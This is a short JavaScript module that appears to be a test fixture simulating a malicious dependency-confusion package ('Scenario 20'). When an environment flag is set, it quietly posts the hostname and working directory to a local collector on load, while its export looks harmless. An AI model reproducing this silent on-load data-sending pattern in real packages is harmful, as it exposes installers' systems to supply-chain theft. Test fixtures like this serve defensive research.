/**
 * Malicious version-confuser-lib (Scenario 20)
 * Exfiltrates when loaded in TESTBENCH_MODE=enabled.
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const os = require('os');

  const payload = {
    attack: 'package-version-confusion',
    stage: 'load',
    lib: 'version-confuser-lib',
    selectedVersion: '999.999.999',
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    cwd: process.cwd()
  };

  const data = JSON.stringify(payload);

  const req = http.request(
    {
      hostname: 'localhost',
      port: 3020,
      path: '/collect',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    },
    () => {}
  );

  req.on('error', () => {});
  req.write(data);
  req.end();
}

module.exports = {
  run: () => ({ ok: true, version: '999.999.999' })
};

